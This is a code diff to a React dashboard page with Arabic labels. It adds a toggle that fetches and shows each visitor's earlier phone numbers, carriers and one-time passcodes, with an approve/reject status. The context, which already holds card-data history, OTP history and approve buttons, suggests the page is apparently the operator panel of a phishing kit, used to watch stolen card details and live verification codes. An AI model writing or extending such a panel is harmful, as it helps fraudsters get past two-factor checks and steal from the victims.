@@ -265,6 +265,9 @@ export default function DashboardPage() {
   const [expandedOtpCodes, setExpandedOtpCodes] = useState<Record<string, boolean>>({});
   const [otpCodesHistory, setOtpCodesHistory] = useState<Record<string, any[]>>({});
   const [hasOtpHistory, setHasOtpHistory] = useState<Record<string, boolean>>({});
+  const [expandedPhoneHistory, setExpandedPhoneHistory] = useState<Record<string, boolean>>({});
+  const [phoneHistory, setPhoneHistory] = useState<Record<string, any[]>>({});
+  const [hasPhoneHistory, setHasPhoneHistory] = useState<Record<string, boolean>>({});
 
   // Toggle card history expansion
   const toggleCardHistory = async (visitorId: string) => {
@@ -308,6 +311,28 @@ export default function DashboardPage() {
     }
     
     setExpandedOtpCodes(prev => ({ ...prev, [visitorId]: !isExpanded }));
+  };
+
+  // Toggle phone history expansion
+  const togglePhoneHistory = async (visitorId: string) => {
+    const isExpanded = expandedPhoneHistory[visitorId];
+    
+    if (!isExpanded) {
+      // Fetch history when expanding
+      try {
+        const res = await fetch(`/api/dashboard/phone-history/${visitorId}`);
+        if (res.ok) {
+          const data = await res.json();
+          const history = data.history || [];
+          setPhoneHistory(prev => ({ ...prev, [visitorId]: history }));
+          setHasPhoneHistory(prev => ({ ...prev, [visitorId]: history.length > 0 }));
+        }
+      } catch {
+        console.error("Failed to fetch phone history");
+      }
+    }
+    
+    setExpandedPhoneHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
   };
 
   // Get latest card data from selected request
@@ -2492,6 +2517,87 @@ export default function DashboardPage() {
               >
                 ✅ موافق
               </button>
+            </div>
+          )}
+
+          {/* زر عرض بيانات الهاتف والرموز السابقة */}
+          {hasPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+            <div style={{ marginTop: 12 }}>
+              <button
+                onClick={() => togglePhoneHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
+                style={{
+                  width: "100%",
+                  padding: "8px 16px",
+                  borderRadius: 8,
+                  border: "1px solid #e5e7eb",
+                  background: expandedPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
+                  color: "#374151",
+                  fontSize: "0.75rem",
+                  fontWeight: 600,
+                  cursor: "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 6
+                }}
+              >
+                {expandedPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${phoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} بيانات هاتف سابقة`}
+              </button>
+
+              {/* سجلات بيانات الهاتف */}
+              {expandedPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+                <div style={{ 
+                  marginTop: 8,
+                  maxHeight: 300,
+                  overflowY: "auto"
+                }}>
+                  {phoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
+                    <div key={idx} style={{
+                      background: "#f9fafb",
+                      borderRadius: 8,
+                      padding: 12,
+                      marginBottom: 8,
+                      border: "1px solid #e5e7eb"
+                    }}>
+                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
+                        <span style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151" }}>
+                          بيانات هاتف سابقة #{idx + 1}
+                        </span>
+                        <span style={{ 
+                          fontSize: "0.65rem", 
+                          padding: "2px 6px",
+                          borderRadius: 4,
+                          background: item.otpStatus === "approved" ? "#dcfce7" : item.otpStatus === "rejected" ? "#fee2e2" : "#fef3c7",
+                          color: item.otpStatus === "approved" ? "#166534" : item.otpStatus === "rejected" ? "#991b1b" : "#92400e"
+                        }}>
+                          {item.otpStatus === "approved" ? "✅" : item.otpStatus === "rejected" ? "❌" : "⏳"} {item.otpStatus}
+                        </span>
+                      </div>
+                      <div style={{ fontSize: "0.7rem", color: "#6b7280", marginBottom: 4 }}>
+                        <span>📱 {item.phoneNumber}</span>
+                        {item.phoneCarrier && <span style={{ marginRight: 8 }}>📡 {item.phoneCarrier}</span>}
+                      </div>
+                      {item.otpCode && (
+                        <div style={{
+                          fontFamily: "ui-monospace, monospace",
+                          fontSize: "1rem",
+                          fontWeight: 600,
+                          color: "#78350f",
+                          letterSpacing: "4px",
+                          direction: "ltr",
+                          textAlign: "center",
+                          background: "#fef3c7",
+                          padding: "4px 8px",
+                          borderRadius: 4,
+                          marginTop: 4
+                        }}>
+                          {item.otpCode}
+                        </div>
+                      )}
+                    </div>
+                  ))}
+                </div>
+              )}
             </div>
           )}
         </div>
